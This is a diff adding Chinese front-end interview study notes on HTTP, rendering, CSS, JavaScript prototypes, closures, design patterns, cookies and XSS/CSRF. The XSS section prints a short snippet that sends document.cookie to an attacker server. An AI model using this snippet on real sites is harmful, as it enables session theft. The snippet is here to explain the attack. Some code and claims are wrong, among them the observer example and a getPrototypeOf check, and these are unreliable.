@@ -1,0 +1,573 @@
+http协议原理：
+HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。
+HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。
+服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。
+
+以下是 HTTP 请求/响应的步骤：
+\1. 客户端连接到Web服务器
+一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，http://www.baidu.com。
+\2. 发送HTTP请求
+通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。
+\3. 服务器接受请求并返回HTTP响应
+Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。
+\4. 释放连接TCP连接
+若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;
+若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;
+\5. 客户端浏览器解析HTML内容
+客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。
+然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。
+客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。
+在浏览器地址栏键入URL，按下回车之后会经历以下流程：
+
+例如：浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;
+1.解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;
+2.浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;
+3.服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;
+4.释放 TCP连接;
+5.浏览器将该 html 文本并显示内容; 
+
+一个http请求的结构：
+第一行：1.请求方法  /2. URL /3. HTTP协议及版本
+4.报文头--- 包含了若干属性包括：user-agent; accpet; referer; content-length; connection;等客户端信息
+5.报文体--- 请求参数的传递： param1 = value1 & param2 = value2
+
+响应结构：
+1.http协议版本 2.状态码
+3.响应头：server类型; content-type; date;
+4.响应体: 返回的数据 
+
+
+http和https区别：
+http明文传输数据，https加密传输
+
+
+
+浏览器渲染原理：
+1.处理 HTML 并构建 DOM 树。
+2.处理 CSS构建 CSSOM 树。
+3.将 DOM 与 CSSOM 合并成一个渲染树。
+4.根据渲染树来布局，计算每个节点的位置。
+5.调用 GPU 绘制，合成图层，显示在屏幕上
+
+渲染
+
+网页生成的时候，至少会渲染一次
+在用户访问的过程中，还会不断重新渲染
+重新渲染需要重复之前的第四步(重新生成布局)+第五步(重新绘制)或者只有第五个步(重新绘制)
+
+在构建 CSSOM 树时，会阻塞渲染，直至 CSSOM树构建完成。
+并且构建 CSSOM 树是一个十分消耗性能的过程，所以应该尽量保证层级扁平，减少过度层叠，越是具体的 CSS 选择器，执行速度越慢
+当 HTML 解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。
+也就是说，如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件。并且CSS也会影响 JS 的执行，
+只有当解析完样式表才会执行 JS，所以也可以认为这种情况下，CSS 也会暂停构建 DOM
+
+重绘（Repaint）和回流（Reflow）
+重绘和回流是渲染步骤中的一小节，但是这两个步骤对于性能影响很大
+
+重绘是当节点需要更改外观而不会影响布局的，比如改变 color 就叫称为重绘
+回流是布局或者几何属性需要改变就称为回流。
+回流必定会发生重绘，重绘不一定会引发回流。回流所需的成本比重绘高的多，改变深层次的节点很可能导致父节点的一系列回流
+
+以下几个动作可能会导致性能问题
+
+改变 window 大小
+改变字体
+添加或删除样式
+文字改变
+定位或者浮动
+盒模型
+
+
+
+
+
+「 CSS篇 」
+
+1. CSS 盒子模型，绝对定位和相对定位
+
+绝对定位：absolute   脱离文档流，相对于第一个有定位的祖先元素进行定位
+相对定位：relative    不脱离文档流，相对自己进行定位，原来所占的空间仍会保留
+
+
+2. 清除浮动，什么时候需要清除浮动，清除浮动都有哪些方法
+
+父元素设置
+overflow:hidden auto scroll 都可以
+
+clearfix::after{
+    content: '';
+    display: block;
+    clear: both;
+}
+
+3. 如何保持浮层水平垂直居中
+
+1）position 元素已知宽度 
+父元素设置为：position: relative; 
+子元素设置为：position: absolute; 
+距上50%，据左50%，然后减去元素自身高度宽的一半就可以实现 
+position:absolute;
+width:100px;
+height:100px;
+top:50%;
+left:50%;
+margin:-50px 0 0 -50px;
+
+2）元素未知宽度                            translate可以用百分比表示：移动自己宽度高度的一半
+把margin:-50px 0 0 -50px 替换成 transform:translate(-50%,-50%);
+
+3)flex布局
+<div class='box'>
+    <div class='content'>
+    </div>
+</div>
+<style>
+    .box{
+        background-color:red;
+        width:300px;
+        height:300px;
+        display:flex;
+        justify-content:center;  //使子项目水平居中
+        align-items:center; //使子项目垂直居中
+    }
+    .content{
+        background-color:black;
+        width:100px;
+        height:100px;
+    }
+
+
+4. position 和 display 的取值和各自的意思和用法
+
+postion是元素布局所用的定位机制，有4种定位：static,absolute,realitve,fixed
+display规定元素应该生成的框的类型，主要有 None,block,inline,inline-block
+
+
+5. 样式的层级关系，选择器优先级，样式冲突，以及抽离样式模块怎么写，说出思路，有无实践经验
+
+选择器优先级：
+引入方式的前后决定优先级，哪个写在后面，哪个优先显示
+权重决定样式优先级，id>class>元素名>继承
+权重值可以计算 id:100, class:10  元素：1  继承：0.5
+样式层级关系：使用z-index属性 值越大越高，元素必须有position属性时，z-index才生效
+解决样式冲突： p{color:red;!important}   重要声明，优先于其他声明
+
+
+6. css3动画效果属性，canvas、svg的区别，CSS3中新增伪类举例
+css3新增伪类和伪元素：
+伪元素
+::after      在元素内部最后面添加内容  伪元素用双冒号
+::before     在元素内部最前面添加内容   伪元素用双冒号
+伪类
+:empty      没有子元素的元素
+:root       选择文档的根元素 即Html元素
+:enable     选择可用的表单元素
+:disable    选择不可用的表单元素
+:checked    选择被选中的表单元素
+:first-child
+:last-child
+:nth-child(odd)
+:nth-child(even)
+:nth-child(n)   匹配父元素下指定子元素，在所有子元素中排第n
+:nth-last-child(n)  匹配父元素下指定子元素，在所有元素中排第N,从后向前数
+
+7. px和em和rem的区别，CSS中link 和@import的区别是?
+   
+   px:绝对大小  em：相对大小
+   默认情况下16px=1em
+
+5. 了解过flex吗?
+
+「 JavaScript 篇 」
+
+JavaScript 基础
+
+1. JavaScript 里有哪些数据类型，解释清楚 null 和 undefined，解释清楚原始数据类型和引用数据类型。比如讲一下 1 和 Number(1)的区别
+
+6种数据类型：null,undefined,boolean,number,string,object 
+js有2种类型，基本类型和引用类型
+undefined和null都是基本类型。
+undefined: undefined只有一个值，即undefined. 当声明的变量还未初始化时，变量的默认值是undefined
+null:null类型也只有一个值就是Null  null用来表示尚未存在的对象。常用来表示函数企图返回一个不存在的对象。
+
+var oValue;
+ovalue == undefined //true     ovalue声明但未初始化，此时值等于undefined
+
+typeof undefined  //undefined
+typeof null      //object       这是JS最初实现的一个错误，被沿用下来，可理解为null就是一个不存在对象的占位符
+
+null == undefined  //true     ECMAJS认为undefined是从null派生出来的,所以定位为相等。但一般情况需要区分这两个类型
+null === undefined  //false   严格等于时，返回false
+typeof null == typeof undefined //false    用typeof时可以发现， 两个值类型不同
+
+调用Number、String、Boolean函数，是转换其他类型到这个类型的语法
+例如Number('xxx')  把字符串类型转换成数值类型
+
+对象中有一类是包装对象：Number,String,Boolean很少直接使用,包装类型是一个对象
+基本类型和包装类型的转换，用了new 就是引用类型，没用new就是转换类型
+基本>包装： new Number(123)
+包装>基本： (new Number(123)).valueOf() 
+
+
+基本类型：基本类型主要是number,string,boolean，null,undefined也是基本类型。
+         任何方法都不会改变基本类型的值，也不能给基本类型添加属性和方法  
+          基本类型的变量存放在栈区（内存里的栈内存）
+          基本类型的比较是值的比较
+          var a = 'david';
+          var b = 'david';
+          a === b //true
+引用类型： 引用类型可以拥有属性和方法，并且是可以动态改变的
+        例： var person = {};
+            person.name = 'david';
+            person.sayname = function(){console.log(person.name)};
+            person.sayname(); //'david'
+            delete person.name;         //删除person对象name属性
+            person.sayname();//undefined;
+
+        引用类型的比较是引用的比较（引用类型的值同时保存在栈内存和堆内存中）
+        var a = {};
+        var b = {};
+        a === b //false     a和b对应的堆内存地址不同，所以返回false
+
+
+2. 讲一下 prototype 是什么东西，原型链的理解，什么时候用 prototype
+prototype:  
+    prototype属性，它是函数所独有的，它是从一个函数指向一个对象。
+    它的含义是函数的原型对象，也就是这个函数（其实所有函数都可以作为构造函数）所创建的实例的原型对象; 
+    这个属性是一个指针，指向一个对象，这个对象的用途就是包含所有实例共享的属性和方法（我们把这个对象叫做原型对象）;
+    
+    __proto__:
+    __proto__ 是原型链查询中实际用到的，它总是指向 prototype，换句话说就是指向构造函数的原型对象，它是对象独有的。
+    注意，为什么Foo构造也有这个属性呢，因为再js的宇宙里万物皆对象，包括函数；
+    
+    原型链:
+    每个对象都可以有一个原型_proto_，这个原型还可以有它自己的原型，以此类推，形成一个原型链.
+    查找特定属性的时候，我们先去这个对象里去找，如果没有的话就去它的原型对象里面去，如果还是没有的话再去向原型对象的原型对象里去寻找......
+    这个操作被委托在整个原型链上，这个就是我们说的原型链了。
+
+结论：
+
+        1、__proto__ 是原型链查询中实际用到的，它总是指向 prototype；
+
+        2、prototype 是函数所独有的，在定义构造函数时自动创建，它总是被 __proto__ 所指。
+
+所有对象都有__proto__属性，函数这个特殊对象除了具有__proto__属性，还有特有的原型属性prototype。
+prototype对象默认有两个属性，constructor属性和__proto__属性。prototype属性可以给函数和对象添加可共享（继承）的方法、属性，
+而__proto__是查找某函数或对象的原型链方式。constructor，这个属性包含了一个指针，指回原构造函数。
+
+    __proto__和prototype的关系：
+    每一个JavaScript对象(除了 null )都具有的一个属性，叫proto,这个属性指向该对象的原型
+    __proto__指向prototype
+    var person = new Person();
+    person.__proto__ === Person.prototype; //true    注意第二个Person大写
+
+    constructor:
+    每个函数都有一个原型对象，该原型对象有一个constructor属性，指向创建对象的函数本身。
+    function Person(){};
+    console.log(Person === Person.prototype.constructor)  //true
+    
+    完整例子:
+    function Person(){
+
+    }
+    var person = new Person();
+    person.__proto__ == Person.prototype;   //true    
+    Person.prototype.constructor == Person; //true
+    Object.getPrototypeOf(Person) === Person.prototype; //true  
+
+
+
+
+
+
+3. 函数里的this什么含义，什么情况下，怎么用。
+    1.在全局环境（函数体外部），this指向全局对象，在浏览器中，window就是全局对象
+    2.在函数环境中，this指向取决于函数的调用方式
+
+4. apply和 call 什么含义，什么区别?什么时候用。
+    apply和call都是用来重定义this对象的
+    区别：
+    B.apply(A,arguments)    //A对象调用B对象的方法，apply方法把参数作为数组传入
+    B.call(A,args1,args2)   //A对象调用B对象的方法，call方法逐个举例参数
+
+
+5. 数组和对象有哪些原生方法，列举一下，分别是什么含义，比如连接两个数组用哪个方法，删除数组的指定项和重新组装数组(操作数据的重点)。
+   数组原生方法：
+   .sort() ; .splice() ; .slice(); push(); unshift(); pop(); shift();
+   forEach() some()  every()
+   concat()   filter()
+   链接数组用concat()方法
+   删除数组指定项用splice()方法，入参2个：splice(起始位置，删除的项数)   ,会返回被删除的项
+
+
+6. 怎样避免全局变量污染?ES5严格模式的作用，ES6箭头函数和ES5普通函数一样吗?
+    避免全局污染的方法：
+    1.利用匿名函数包裹程序脚本
+    (function(){
+        //程序脚本
+    })();
+    2.定义全局变量命名空间，只创建一个全局变量，并定义该变量为当前应用容器，把其他全局变量追加在该命名空间下
+    var my = {};
+    my.name = {
+        big_name: 'zhangsan',
+        small_name: 'lisi'
+    };
+    my.work = {
+        school_work:'study',
+        family_work: 'we are'
+    }
+
+    严格模式的区别：
+    在脚本头部添加'use strict' 声明
+    在ES5中出现，不是一条语句，但是一个字面量表达式
+    变量必须先声明，不允许使用未定义对象，不允许删除变量和对象，不允许函数形参同名
+    限制对调用栈的检测能力，访问arguments.callee 会报错
+    严格模式的作用：
+    消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;
+    消除代码运行的一些不安全之处，保证代码运行的安全；
+    提高编译器效率，增加运行速度；
+    为未来新版本的Javascript做好铺垫。
+
+JavaScript 的面向对象
+
+1. JS 模块包装格式都用过哪些，CommonJS、AMD、CMD。定义一个JS 模块代码，最精简的格式是怎样。
+
+2. JS 怎么实现一个类。怎么实例化这个类。
+    实现一个类时最好使用构造函数+原型构造的方法，这样可以最大限度实现类的概念。
+    构造函数
+    function Person(name,age){
+        this.name = 'xxx';
+        this.age = 30;
+        this.fn = function(){
+
+        }
+    }
+    原型构造函数
+    function Person(){
+
+    }
+    Person.prototype.name = 'xxx';
+    Person.prototype.age = 30;
+    var person = new Person();
+    
+
+3. 理解闭包吗?请讲一讲闭包在实际开发中的作用;闭包建议频繁使用吗?
+    闭包：
+    定义在一个函数内部的函数，可以访问外部函数内的变量，且函数作用域一直存在，就是闭包。
+    例子：
+    function a(){
+        var i = 0;
+        function b(){      //函数b嵌套在函数a内部
+            alert(++i);
+        }               
+        return b;         //函数a返回函数b
+    }
+    var c = a();   //c指向了函数b
+    c();   //执行c会返回++i    此处函数c引用了函数a内部的函数b，这就是一个闭包
+
+    这样在执行完var c=a()后，变量c实际上是指向了函数b，再执行c()后就会弹出一个窗口显示i的值（第一次为1）。
+    这段代码其实就创建了一个闭包，这是因为函数a外的变量c引用了函数a内的函数b。
+    也就是说，当函数a的内部函数b被函数a外的一个变量引用的时候，就创建了一个闭包。
+    作用：1.垃圾回收机制不会回收a所占用的资源，因为a内部的函数b执行需要依赖a中的变量i
+          2.包含函数内变量的安全，函数a的变量i只有函数b可以访问
+          3.在内存中维持一个变量，由于闭包，函数a中的i一直存在于内存中，因此每次执行c(),都会自加1
+
+4. 说一下了解的js 设计模式，解释一下单例、工厂、观察者。
+    工厂模式：   把一个对象封装在函数内，并将对象return出去
+    function createHotel(name,rooms){
+        var hotel = new Object();
+        hotel.name = name;
+        hotel.rooms = rooms;
+        hotel.fn = function(){
+
+        }
+        return hotel;
+    }
+    var xxx = createHotel('xxx',100);
+
+    单例模式：  只能被实例化一次
+    var Single = function(name){
+        this.name = name;
+    };
+    Single.prototype.getName = function(){
+        return this.name;
+    }
+    var getInstance = (function(){
+        var instance = null;
+        return function(name){
+            if(!instance){   //相当于一个一次性阀门，只能实例化一次
+                instance = new Single(name);
+            }
+            return instance;
+        }
+    })();
+    //测试单例模式的实例，a===b
+    var a = getInstance('aa');
+    var b = getInstance('bb');
+    
+    观察者模式(发布者订阅模式)：  有新消息就会推送的模式
+    var shoeObj = {};  //定义发布者
+    shoeObj.list = {};    //缓存列表，存放订阅者回调函数
+    //增加订阅者
+    shoeObj.listen = function(fn){
+        shoeObj.list.push(fn);  //订阅消息添加到缓存列表
+    }
+    //发布消息
+    shoeObj.trigger = function(){
+        for(var i=0,fn;fn=this.list[i++];){
+            fn.apply(this,arguments);  //第一个参数只是改变fn的this
+        }
+    }
+    //小红订阅如下消息
+    shoeObj.listen(function(color,size){
+        console.log('颜色是：'+color);
+        console.log('尺码是：'+size);
+    })
+    //小黑订阅如下消息
+    shoeObj.listen(function(color,size){
+        console.log('再次打印颜色是：'+color);
+        console.log('再次打印尺码是:'+size);
+    })
+    shoeObj.trigger('红色',40);
+    shoeObj.trigger('黑色',42);
+
+5. ajax 跨域有哪些方法，jsonp 的原理是什么，如果页面编码和被请求的资源编码不一致如何处理?
+    跨域方法： jsonp 
+
+「 开源工具 」
+
+1)是否了解开源的架构工具 bower、npm、yeoman、gulp、webpack，有无用过，有无写过，一个 npm 的包里的 package.json 具备的必要的字段都有哪些(名称、版本号，依赖)
+
+2)github常用不常用，关注过哪些项目
+
+3)会不会用 ps 扣图，png、jpg、gif 这些图片格式解释一下，分别什么时候用。如何优化图像、图像格式的区别
+
+4)说一下你常用的命令行工具
+
+5)会不会用git，说上来几个命令，说一下git和svn的区别，有没有用git解决过冲突
+
+「 计算机网络基础 」
+
+1)说一下HTTP 协议头字段说上来几个，是否尽可能详细的掌握HTTP协议。一次完整的HTTP事务是怎样的一个过程?
+    http协议：http协议是7层协议中的应用层协议
+    http请求包括请求头和响应头
+    主要包括：
+    request method:    post get 
+    status code :   200表示OK
+    accept:'text/html'     用于告诉服务器，客户端支持的数据类型
+    accept-charset:             客户机编码格式
+    accept-encoding:      数据压缩格式
+    host:                想访问的主机名
+    referer:        客户机通过这个头告诉服务器，它（客户端）是从哪个资源来访问服务器的（防盗链）
+    user-agent:     客户机的软件环境
+    cookie:         通过请求头将cookie信息带给服务器
+    date:           当前请求时间
+
+    响应头：
+    location:     通过这个头告诉服务端找谁
+    server:        告诉浏览器，服务器的类型
+    content-encoding:       告诉浏览器服务器压缩数据的格式
+    content-length:     告诉浏览器回送数据的长度
+    content-type:       告诉浏览器回送数据的类型
+    last-modified:   告诉浏览器当前资源的缓存时间
+    date:           服务器响应的时间
+    refresh:            告诉浏览器间隔多长时间刷新
+    status:     
+大致步骤就是：浏览器先向服务器发送请求，服务器接收到请求后，做相应的处理，然后封装好响应报文，再回送给浏览器。
+浏览器拿到响应报文后，再通过 浏览器引擎去渲染网页，解析DOM树，javascript引擎解析并执行脚本操作，
+插件去干插件该干的事儿...关于浏览器渲染、解析的原理，可以参考http://kb.cnblogs.com/page/129756/
+
+说白了，所谓web的本质，无非是：请求/处理/响应 ，任何的web服务器，任何的服务端编程语言，都没法脱离这个本质。 
+
+
+
+2)cookies 是干嘛的，服务器和浏览器之间的 cookies 是怎么传的，httponly 的 cookies 和可读写的 cookie 有什么区别，有无长度限制
+
+请描述一下cookies，sessionStorage和localStorage的区别
+
+cookie是用户访问web时，保存在用户本地的客户端相关信息的一个文本，由name,value组成
+
+浏览器发送请求，服务器响应请求返回一个setCookie
+浏览器再次发送请求时会带刷这个cookie
+
+httpOnly的作用：在cookie中设置了httpOnly属性，JS脚本就无法读取cookie信息，能防止XSS攻击，窃取用户cookie
+都是记录客户状态的机制，但是cookie保存在客户端本地，session保存在服务器
+cookie:设置过期时间前，一直有效
+sessionStorage: 生命周期为当前浏览器窗口关闭，那么sessionStorage保存的数据就清空
+localStorage:   生命周期是永久的
+
+
+
+3)从敲入 URL 到渲染完成的整个过程，包括 DOM 构建的过程，说的约详细越好。
+
+
+
+4)是否了解Web注入攻击，说下原理，最常见的两种攻击(XSS 和 CSRF)了解到什么程度。
+XSS:跨站脚本攻击
+反射型：XSS代码添加在URL请求中。用户点击链接，服务器响应后，在返回的响应内容中出现攻击者的XSS代码
+例子：
+窃取cookie,读取目标网站的cookie发送到黑客的服务器上
+var i=document.createElement("img");
+document.body.appendChild(i);
+i.src = "http://www.hackerserver.com/?c=" + document.cookie;
+
+持久型：把攻击代码储存在web server中，例如留言板，签名等可以上传数据的地方。
+
+防御方法：不信任用户输入的任何内容，对用户输入的内容全部过滤
+
+5)是否了解公钥加密和私钥加密。如何确保表单提交里的密码字段不被泄露。验证码是干嘛的，是为了解决什么安全问题。
+
+6)编码常识：文件编码、URL 编码、Unicode编码 什么含义。一个gbk编码的页面如何正确引
+
+「 前端框架 」
+
+1) 对 MVC、MVVM的理解
+
+MVVM是Model-View-ViewModel的简写。它本质上就是MVC （Model-View- Controller）的改进版。
+即模型-视图-视图模型。【模型】指的是后端传递的数据。【视图】指的是所看到的页面。
+【视图模型】mvvm模式的核心，它是连接view和model的桥梁。
+它有两个方向：一是将【模型】转化成【视图】，即将后端传递的数据转化成所看到的页面。
+实现的方式是：数据绑定。二是将【视图】转化成【模型】，即将所看到的页面转化成后端的数据。
+实现的方式是：DOM 事件监听。这两个方向都实现的，我们称之为数据的双向绑定。
+
+2) vue、angularjs等 相对于 jQuery在开发上有什么优点?
+
+3)前后分离的思想了解吗?
+
+4)你上一个项目都用到了那些方法优化js的性能?
+
+5)angular的生命周期?
+
+6)说一下你对vue和vuex的使用方法，vue的组件复用机制
+
+考察学习能力和方法
+
+1)你每天必须登录的网站(前端技术相关)是什么?
+
+2)前端技术方面看过哪些书，有无笔记，都有哪些收获。
+
+3)收藏了哪些代码片段?有想过开源自己的代码嘛?
+
+4)怎么理解前端技术的大趋势?自己再做哪方面的知识储备?
+
+5)是否了解或精通其他(后端)的编程语言?
+
+6)做项目有没有遇到哪些印象深刻的技术攻关，具体遇到什么问题，怎么找答案的，最后怎么解的。
+
+7)对以后自己的前端职业路线，怎么规划？
+
+
+
+
+什么是前端渲染和后端渲染？
+前端发展经历的3个阶段：
+1.后端渲染：早期的页面url会发送给服务器，利用jsp/php技术生成一个html+css+java的页面，直接返回给浏览器显示，利用服务器解析，称之为后端渲染
+2.前端渲染(前后端分离阶段)：随着ajax出现，有了前后端分离开发模式，后端只提供API,前端通过ajax获取数据，并通过js将数据渲染到页面上
+3.单页面富应用(SPA):
+整个网页只有一个HTML页面，在前后端分离的基础上加了一层前端路由,由*前端路由*管理一套映射关系
+例如：
+url1: xxx/home 
+url2: xxx/about
+url3: xxx/me
+
+引用类型和基本类型
